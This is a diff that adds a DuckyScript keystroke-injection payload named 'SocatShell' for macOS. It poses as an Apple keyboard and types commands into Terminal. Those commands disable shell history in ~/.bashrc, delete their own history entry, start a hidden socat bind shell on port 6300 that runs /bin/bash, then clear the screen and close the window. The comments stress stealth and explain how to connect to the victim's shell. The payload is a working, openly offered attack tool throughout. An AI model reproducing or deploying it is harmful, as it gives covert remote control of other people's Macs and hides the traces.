@@ -1,0 +1,47 @@
+REM This script sets up a TCP listener using socat for remote shell access.
+REM Proceeds to clear the terminal and minimize the window for stealth.
+REM It listens on the specified port (6300) 
+
+
+REM Once this script is executed there will be an open listener on port 6300
+REM you will be able to use the command 'socat STDIN TCP:<remote_ip_address>:6300'
+REM this will establish a connection to the remote computer on port 6300 
+REM and you should be able to interact with the remote shell
+
+REM Requirement: i.p. of target MacOs and socat application
+REM can install using homebrew 'brew install socat'
+
+REM Title: SocatShell
+REM Author: NARSTY
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Recon
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+ENTER
+DELAY 500
+STRING  nohup socat TCP-LISTEN:6300 EXEC:/bin/bash &>/dev/null &
+DELAY 2000
+ENTER
+DELAY 500
+STRING  clear
+ENTER
+DELAY 250
+GUI w
+
+
